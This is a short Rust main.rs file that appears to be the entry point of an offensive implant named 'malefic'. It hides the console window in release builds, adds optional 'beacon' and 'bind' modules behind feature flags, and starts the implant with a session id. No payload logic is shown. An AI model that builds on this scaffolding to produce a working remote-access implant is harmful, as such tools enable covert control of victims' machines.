#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]
mod malefic;
mod stub;
mod meta;

#[cfg(feature = "beacon")]
mod beacon;
#[cfg(feature = "bind")]
mod bind;

use crate::malefic::Malefic;

#[async_std::main]
async fn main() {
   Malefic::run(malefic_proto::get_sid()).await;
}